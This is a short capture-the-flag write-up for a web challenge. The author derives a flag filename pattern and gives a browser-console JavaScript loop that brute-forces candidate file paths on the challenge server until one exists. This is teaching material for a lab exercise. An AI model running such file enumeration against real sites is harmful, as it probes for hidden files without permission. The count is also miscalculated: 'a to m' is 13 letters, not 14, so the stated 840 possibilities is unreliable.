# Brute Force
# Web: Easy/Medium

Based on the regex formatting, the unknown part of the flag contains 4
characters: a letter from a to m, followed by one of "aqc", followed by one of
"zm", followed by a digit.

Calculating the number of possibilities, we have 14 * 3 * 2 * 10 = 840 possible
filenames, which is a very small number, so we can simply brute force all 
possible filenames until we reach one that does not return a 404. 

Here, you may use whatever language or tool you want, but I like to open up the
browser devtools and write a JavaScript right on the page. Here's my solution
code; it's not the fastest (since we are only waiting on one request at a time)
but it's fast enough for this use case.

```javascript
async function tryFilename(filename) {
    const resp = await fetch(location.origin + "/" + filename);
    return resp.ok;
}

for(let a of "abcdefghijklm".split('')) {
    for(let b of "aqc".split('')) {
        for(let c of "zm".split('')) {
            for(let d of "1234567890".split('')) {
                const filename = "flag" + a + b + c + d + ".txt";
                if(await tryFilename("flag" + a + b + c + d + ".txt")) {
                    alert("found filename: " + filename);
                }
            }
        }
    }
}

```